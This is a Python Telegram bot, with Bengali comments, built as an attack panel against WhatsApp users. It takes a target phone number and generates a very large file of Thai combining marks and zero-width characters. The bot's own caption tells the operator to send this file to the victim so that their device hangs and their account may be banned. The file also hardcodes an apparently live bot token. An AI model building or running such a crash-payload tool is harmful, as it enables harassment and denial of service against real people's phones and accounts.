import logging
import sqlite3
import os
import asyncio
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, ReplyKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes

# ১. লগিং সেটআপ
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# ২. কনফিগারেশন (টোকেন এবং আপনার আইডি)
TOKEN = "8675593212:AAHQ24gVWFi0zTGgUFXN5qkr_D2IyE0tE88"
ADMIN_ID = 6856009995  # আপনার আইডি

# ৩. ডেটাবেস সেটআপ
def init_db():
    conn = sqlite3.connect('m_r_developer_final.db')
    cursor = conn.cursor()
    cursor.execute('''CREATE TABLE IF NOT EXISTS stats (id INTEGER PRIMARY KEY, count INTEGER)''')
    cursor.execute("INSERT OR IGNORE INTO stats (id, count) VALUES (1, 0)")
    conn.commit()
    conn.close()

# ৪. অত্যন্ত শক্তিশালী পেলোড তৈরির লজিক (যা আইডি ব্যান করতে সাহায্য করবে)
def generate_ban_file(target):
    filename = f"CRASH_REPORT_{target}.txt"
    # এমন ক্যারেক্টার যা প্রসেসরকে লুপে ফেলে দেয়
    crash_chars = "\u0E47\u0E48\u0E49\u0E4A\u0E4B\u0E4C\u0E4D" * 25
    invisible = "\u200B\u200C\u200D\uFEFF" * 30
    chunk = (crash_chars + invisible) * 500  # ডাটা ব্লক
    
    try:
        with open(filename, "w", encoding="utf-8") as f:
            # ১০ লক্ষেরও বেশি ক্যারেক্টার তৈরি করবে
            for _ in range(1500):
                f.write(chunk)
        return filename
    except Exception as e:
        logger.error(f"Error creating file: {e}")
        return None

# ৫. স্টার্ট কমান্ড (বট স্টার্ট দিলেই ড্যাশবোর্ড আসবে)
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    # অ্যাডমিন ভেরিফিকেশন
    if user_id != ADMIN_ID:
        await update.message.reply_text("❌ Access Denied! আপনি এই বটের মালিক নন।")
        return

    # ইনলাইন বাটন (ড্যাশবোর্ড)
    keyboard = [
        [InlineKeyboardButton("🚀 Attack WhatsApp (Ban)", callback_data='attack')],
        [InlineKeyboardButton("📊 My Stats", callback_data='status')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    welcome_text = (
        "🔥 **M R DEVELOPER ULTIMATE PANEL** 🔥\n\n"
        f"স্বাগতম বস! আপনার আইডি `{user_id}` ভেরিফাইড।\n"
        "নিচের ড্যাশবোর্ড থেকে অপারেশন সিলেক্ট করুন।"
    )
    
    await update.message.reply_text(welcome_text, reply_markup=reply_markup, parse_mode='Markdown')

# ৬. বাটন ক্লিক হ্যান্ডলার
async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    user_id = query.from_user.id
    
    if user_id != ADMIN_ID:
        await query.answer("অ্যাক্সেস নেই!", show_alert=True)
        return

    await query.answer()

    if query.data == 'attack':
        await query.edit_message_text("📱 টার্গেট হোয়াটসঅ্যাপ নম্বরটি দিন (যেমন: 8801XXXXXXXXX):")
        context.user_data['state'] = 'INPUT_NUMBER'
    
    elif query.data == 'status':
        conn = sqlite3.connect('m_r_developer_final.db')
        cur = conn.cursor()
        cur.execute("SELECT count FROM stats WHERE id=1")
        total = cur.fetchone()[0]
        conn.close()
        
        # স্ট্যাটাস দেখে আবার ড্যাশবোর্ডে ফেরার বাটন
        back_keyboard = [[InlineKeyboardButton("🔙 Back to Dashboard", callback_data='back')]]
        await query.edit_message_text(
            f"📊 **অপারেশন স্ট্যাটাস**\n\nআজ পর্যন্ত মোট সফল হিট: {total} টি।",
            reply_markup=InlineKeyboardMarkup(back_keyboard)
        )

    elif query.data == 'back':
        # আবার মেইন ড্যাশবোর্ড দেখাবে
        keyboard = [
            [InlineKeyboardButton("🚀 Attack WhatsApp (Ban)", callback_data='attack')],
            [InlineKeyboardButton("📊 My Stats", callback_data='status')]
        ]
        await query.edit_message_text("🔥 **M R DEVELOPER MAIN DASHBOARD** 🔥", reply_markup=InlineKeyboardMarkup(keyboard))

# ৭. নম্বর ইনপুট এবং ফাইল সেন্ডিং
async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id != ADMIN_ID: return

    if context.user_data.get('state') == 'INPUT_NUMBER':
        target_num = update.message.text
        context.user_data['state'] = None
        
        load_msg = await update.message.reply_text(f"⏳ `{target_num}` এর জন্য ফাইল জেনারেট হচ্ছে...\nধৈর্য ধরুন, এটি অত্যন্ত বড় ফাইল।", parse_mode='Markdown')
        
        # ব্যাকগ্রাউন্ড থ্রেডে ফাইল তৈরি (যাতে বট ক্রাশ না করে)
        file_path = await asyncio.to_thread(generate_ban_file, target_num)
        
        if file_path and os.path.exists(file_path):
            try:
                with open(file_path, 'rb') as document:
                    await update.message.reply_document(
                        document=document,
                        caption=(
                            f"✅ **অপারেশন সফল!**\n\n"
                            f"টার্গেট: `{target_num}`\n\n"
                            "⚠️ **ব্যবহার:** এই ফাইলটি হোয়াটসঅ্যাপে ডকুমেন্ট হিসেবে সেন্ড করুন। ভিকটিম এটি ওপেন করলে তার ডিভাইস হ্যাং হবে এবং স্প্যাম ফিল্টারে আইডি ব্যান হওয়ার ঝুঁকি থাকবে।"
                        ),
                        parse_mode='Markdown'
                    )
                
                # সংখ্যা আপডেট
                conn = sqlite3.connect('m_r_developer_final.db')
                cur = conn.cursor()
                cur.execute("UPDATE stats SET count = count + 1 WHERE id=1")
                conn.commit()
                conn.close()
                
            except Exception as e:
                await update.message.reply_text(f"❌ ফাইল পাঠাতে ত্রুটি: {str(e)}")
            finally:
                if os.path.exists(file_path):
                    os.remove(file_path)
        else:
            await update.message.reply_text("❌ ফাইল তৈরি করা সম্ভব হয়নি।")
            
        await load_msg.delete()

# ৮. মেইন রানার
def main():
    init_db()
    application = Application.builder().token(TOKEN).build()
    
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CallbackQueryHandler(button_handler))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text))
    
    print("Bot is LIVE for M R DEVELOPER...")
    application.run_polling()

if __name__ == '__main__':
    main()
    
